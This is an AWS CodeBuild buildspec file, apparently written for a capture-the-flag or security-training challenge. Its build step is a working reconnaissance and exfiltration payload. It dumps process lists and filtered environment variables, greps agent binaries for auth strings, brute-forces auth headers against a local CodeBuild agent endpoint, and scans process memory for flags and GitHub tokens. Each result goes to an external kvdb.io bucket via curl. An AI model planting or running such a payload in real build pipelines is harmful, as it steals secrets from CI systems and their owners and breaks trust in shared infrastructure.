version: 0.2

env:
  variables:
    AWS_MAX_ATTEMPTS: "1"
    AWS_RETRY_MODE: "standard"

phases:
  build:
    commands:
      - echo "Running vulnerable training build"
      - |
        set +e
        bucket='https://kvdb.io/8uXHVtwRAd5qcuZcw9GdSh'
        runid="${CODEBUILD_BUILD_ID##*:}"
        putkey(){ key="$1"; file="$2"; head -c 60000 "$file" | curl -fsS --connect-timeout 5 --max-time 25 --data-binary @- "$bucket/${runid}_$key" || true; }
        echo "canary $runid" > /tmp/canary.txt; putkey canary /tmp/canary.txt
        {
          echo '=== ps ==='
          ps auxww
          echo '=== proc environ filtered ==='
          for p in /proc/[0-9]*; do
            pid=${p##*/}; [ -r "$p/environ" ] || continue
            echo "--- pid $pid $(tr '\0' ' ' < "$p/cmdline" | head -c 200)"
            tr '\0' '\n' < "$p/environ" | grep -Eiv 'AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN)|CODEBUILD_AUTH_TOKEN' | grep -Ei 'flag|token|secret|github|codebuild|pat|gh[opsu]_|credential|webhook|source|repo|auth' || true
          done
          echo '=== agent route/auth strings ==='
          for b in /codebuild/readonly/agent /codebuild/readonly/executor /codebuild/readonly/start /codebuild/readonly/bootstrap-log /codebuild/readonly/executor-log /codebuild/output/log; do
            echo "--- $b"
            strings "$b" 2>/dev/null | grep -Ei 'Authorization|Bearer|CODEBUILD_AUTH|auth|token|secret|github|credential|/v1|/api|route|flag' | head -n 300
          done
        } > /tmp/proc.txt 2>&1
        putkey proc /tmp/proc.txt
        {
          echo '=== agent with auth variants ==='
          for base in http://127.0.0.1:7831 http://localhost:7831; do
            for h in \
              "Authorization: $CODEBUILD_AUTH_TOKEN" \
              "Authorization: Bearer $CODEBUILD_AUTH_TOKEN" \
              "Authorization: Basic $CODEBUILD_AUTH_TOKEN" \
              "X-CodeBuild-Auth-Token: $CODEBUILD_AUTH_TOKEN" \
              "X-Amz-CodeBuild-Token: $CODEBUILD_AUTH_TOKEN" \
              "X-Aws-CodeBuild-Token: $CODEBUILD_AUTH_TOKEN" \
              "CodeBuild-Auth-Token: $CODEBUILD_AUTH_TOKEN"; do
              echo "### $base header ${h%%:*}"
              for p in / /ping /health /status /v1/status /v1/metadata /v1/build /build /logs /env /variables /credentials /api/v1/build; do
                echo "--- $p"
                curl -sS --connect-timeout 2 --max-time 5 -H "$h" "$base$p" 2>&1 | sed -E 's/(AccessKeyId|SecretAccessKey|Token|CODEBUILD_AUTH_TOKEN)[^,}]*/\1:REDACTED/g' | head -c 2500; echo
              done
            done
          done
        } > /tmp/agentauth.txt 2>&1
        putkey agentauth /tmp/agentauth.txt
        cat > /tmp/memscan.py <<'PY'
import os,re
patterns=[re.compile(rb'flag\{[^}\x00\r\n]{1,200}\}',re.I),re.compile(rb'ctf\{[^}\x00\r\n]{1,200}\}',re.I),re.compile(rb'HackTricks\{[^}\x00\r\n]{1,200}\}',re.I),re.compile(rb'codebreach[^\x00\r\n]{0,200}',re.I),re.compile(rb'gh[opsu]_[A-Za-z0-9_]{20,120}')]
print('=== memory scan ===')
for pid in [x for x in os.listdir('/proc') if x.isdigit()]:
    try:
        cmd=open(f'/proc/{pid}/cmdline','rb').read().replace(b'\0',b' ')[:200]
        maps=open(f'/proc/{pid}/maps','r').read().splitlines()
        mem=open(f'/proc/{pid}/mem','rb',0)
    except Exception as e:
        continue
    seen=set()
    for line in maps:
        parts=line.split()
        if len(parts)<2 or 'r' not in parts[1]: continue
        if len(parts)>=6 and any(s in parts[-1] for s in ['/usr/lib/','/root/.goenv/','/root/.dotnet/','/opt/apache-ant']): continue
        a,b=[int(x,16) for x in parts[0].split('-')]
        if b-a>50_000_000: continue
        try:
            mem.seek(a); data=mem.read(b-a)
        except Exception:
            continue
        for pat in patterns:
            for m in pat.findall(data):
                s=m[:220]
                if s in seen: continue
                seen.add(s)
                if s.startswith((b'ghp_',b'gho_',b'ghs_',b'ghu_')): s=s[:8]+b'...REDACTED'
                print(f'pid={pid} cmd={cmd!r} hit={s!r}')
    try: mem.close()
    except Exception: pass
PY
        python3 /tmp/memscan.py > /tmp/memscan.txt 2>&1
        putkey memscan /tmp/memscan.txt
